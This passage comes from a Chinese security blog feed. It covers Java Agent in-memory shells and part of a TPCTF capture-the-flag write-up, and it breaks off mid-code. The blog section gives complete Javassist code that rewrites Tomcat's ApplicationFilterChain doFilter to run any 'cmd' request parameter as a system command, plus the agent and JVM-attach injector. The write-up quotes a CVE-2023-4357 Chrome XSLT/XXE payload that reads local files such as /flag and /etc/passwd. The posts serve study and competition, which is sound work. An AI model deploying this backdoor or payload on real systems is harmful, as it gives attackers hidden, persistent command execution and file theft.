class="comment">//添加一个transformer到Instrumentation，并重新触发目标类加载  </span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Hello_Transform</span>(),<span class="literal">true</span>);  </span><br><span class="line">                inst.retransformClasses(cls);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transformer 修改类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool            ClassPool classPool = ClassPool.getDefault();  </span></span><br><span class="line">  </span><br><span class="line">            <span class="comment">//添加额外的类搜索路径  </span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);  </span><br><span class="line">                classPool.insertClassPath(ccp);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取目标类  </span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;AgentShell.Sleep_Hello&quot;</span>);  </span><br><span class="line">            System.out.println(ctClass);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取目标方法  </span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//设置方法体  </span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;  </span><br><span class="line">            ctMethod.setBody(body);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//返回目标类字节码  </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完毕之后打包 Java Agent 包，这里有个坑点是 <code>MAINFEST.MF</code> 需要修改如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span>  </span><br><span class="line">Agent-Class: AgentShell.agentmain_transform  </span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span>  </span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>最后编写动态注入 Agent 的注入类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            System.out.println(vmd.displayName());  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//连接指定JVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//加载Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\target\\Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//断开JVM连接  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/InjectAgentSuccess.png" class><h3 id="Instrumentation-的局限性"><a href="#Instrumentation-的局限性" class="headerlink" title="Instrumentation 的局限性"></a>Instrumentation 的局限性</h3><p>大多数情况下，我们使用 Instrumentation 都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：</p><p>premain 和 agentmain 两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，也就是说必须要带有 Class 类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p><p>类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 <code>Instrumentation#redefineClasses</code> 方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是 private static&#x2F;final 修饰的</li><li>可以修改方法体</li></ol><h2 id="Agent-内存马实战"><a href="#Agent-内存马实战" class="headerlink" title="Agent 内存马实战"></a>Agent 内存马实战</h2><p>比如这里我们起一个 SpringBoot 的服务，由于 Tomcat 的责任链机制，可以看到会按照责任链机制反复调用 <code>ApplicationFilterChain#doFilter()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟到 <code>internalDoFilter()</code> 方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                  ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上两个方法均拥有 ServletRequest 和 ServletResponse，并且 hook 不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用</p><h3 id="利用-Java-Agent-实现-Spring-Filter-内存马"><a href="#利用-Java-Agent-实现-Spring-Filter-内存马" class="headerlink" title="利用 Java Agent 实现 Spring Filter 内存马"></a>利用 Java Agent 实现 Spring Filter 内存马</h3><p>我们复用上面的 agentmain-Agent，修改字节码的关键在于 <code>transformer()</code> 方法，因此我们重写该方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool            ClassPool classPool = ClassPool.getDefault();  </span></span><br><span class="line">  </span><br><span class="line">            <span class="comment">//添加额外的类搜索路径  </span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);  </span><br><span class="line">                classPool.insertClassPath(ccp);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取目标类  </span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取目标方法  </span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//设置方法体  </span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+  </span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">            ctMethod.setBody(body);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//返回目标类字节码  </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再准备 <code>MAINFEST.MF</code> 配置，以及 agent 主类代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmain_transform</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;  </span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//获取目标JVM加载的全部类  </span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//添加一个transformer到Instrumentation，并重新触发目标类加载  </span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Filter_Transform</span>(),<span class="literal">true</span>);  </span><br><span class="line">                inst.retransformClasses(cls);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>MAINFEST.MF</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span>  </span><br><span class="line">Agent-Class: com.drunkbaby.agentmain_transform</span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span>  </span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后准备 Inject 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            System.out.println(vmd.displayName());  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().contains(<span class="string">&quot;JavaAgentSpringBootApplication&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//连接指定JVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//加载Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\JavaSecurityLearning\\JavaSecurity\\MemoryShell\\Java-Agent-Memshell\\AgentInjectionExample\\target\\AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//断开JVM连接  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入成功</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/InjectSpringAgent.png" class><p>总而言之的攻击面应该是注入到 JVM 进程中</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>比起传统的 Tomcat 内存马，Agent 内存马在实现形式上其实还是打的 Tomcat 内存马。然而它的实现角度是通过遍历所有的 JVM 进程，然后向进程中去注入对应的 agent 类的。在 agent 类中通过 <code>ClassPool</code> 生成恶意代码</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">Java Agent 内存马</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE Apply For OpenWBS Productions</title>
    <link href="https://drun1baby.github.io/2023/11/30/CVE-Apply-For-OpenWBS-Productions/"/>
    <id>https://drun1baby.github.io/2023/11/30/CVE-Apply-For-OpenWBS-Productions/</id>
    <published>2023-11-30T06:21:58.000Z</published>
    <updated>2023-12-04T02:55:06.421Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3c0968a9a6ed77a1dd8d93580b7365bb9facbcc6f69d0d61fefd08fa43830035"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CVE" scheme="https://drun1baby.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://drun1baby.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>2023 TPCTF WP</title>
    <link href="https://drun1baby.github.io/2023/11/28/2023-TPCTF-WP/"/>
    <id>https://drun1baby.github.io/2023/11/28/2023-TPCTF-WP/</id>
    <published>2023-11-28T07:36:15.000Z</published>
    <updated>2023-11-30T01:13:08.547Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Nepnep yyds！</li></ul><h1 id="2023-TPCTF-WP"><a href="#2023-TPCTF-WP" class="headerlink" title="2023 TPCTF WP"></a>2023 TPCTF WP</h1><h2 id="xssbot-SOLVED-working-晚风"><a href="#xssbot-SOLVED-working-晚风" class="headerlink" title="xssbot | SOLVED | working : 晚风"></a>xssbot | SOLVED | working : 晚风</h2><p>看着像用前几天爆出来的这个CVE-2023-4357来任意文件读取，本地复现ing…done!</p><p>payload</p><img src="/2023/11/28/2023-TPCTF-WP/web1.png" class><p>魔改自：<a class="link" href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/28/2023-TPCTF-WP/xxe.png" class><h2 id="Xssbot-but-no-Internet-SOLVED-working-LemonPrefect，晚风"><a href="#Xssbot-but-no-Internet-SOLVED-working-LemonPrefect，晚风" class="headerlink" title="Xssbot but no Internet | SOLVED | working : LemonPrefect，晚风"></a>Xssbot but no Internet | SOLVED | working : LemonPrefect，晚风</h2><p>BOT 接受一个文件并使用 Chrome 无头浏览器进行访问，根据 Dockerfile 可知其 flag 位于 <code>/flag</code>。因此使用最近释出的针对 &lt;116.0.5845.96 版本 Chrome 的 libxslt 任意文件包含漏洞处理。</p><p>默认情况下，Chrome 对跨域做了严格的限制，但针对于 XSL 样式表中利用 <code>document()</code> 包含的外部文件没有做严格限定。因此可以利用这部分进行文件包含。</p><blockquote><p><a class="link" href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE<i class="fas fa-external-link-alt"></i></a></p></blockquote><p>由于靶机并不能出网，所以无法直接发起请求外带出文件。分析 BOT 的代码发现其在 <code>driver.get</code> 方法中访问上传的文件并 catch 了所有错误。因此尝试使 <code>get</code> 方法产生异常。</p><p>此处使用一个超长的 url 重定向使 Chrome 崩溃从而产生一个 <code>selenium.common.exceptions.TimeoutException</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;?#&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">div</span> [</span></span><br><span class="line"><span class="meta">  &lt;!-- <span class="meta">&lt;!ENTITY <span class="keyword">passwd_p</span>        <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">passwd_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta">  &lt;!-- <span class="meta">&lt;!ENTITY <span class="keyword">sysini_p</span>        <span class="string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">sysini_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;p class=&quot;&amp;passwd_p;&quot;&gt;&amp;passwd_c;&lt;/p&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>&amp;sysini_c;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:40rem&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#r&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">remote web url:    &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;<span class="subst">$&#123;location.href&#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> text = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            flag = p.<span class="property">innerText</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(flag.<span class="title function_">startsWith</span>(<span class="string">&quot;LEMON_HIT_FLAG&quot;</span>))&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> total = <span class="number">0</span>;</span></span><br><span 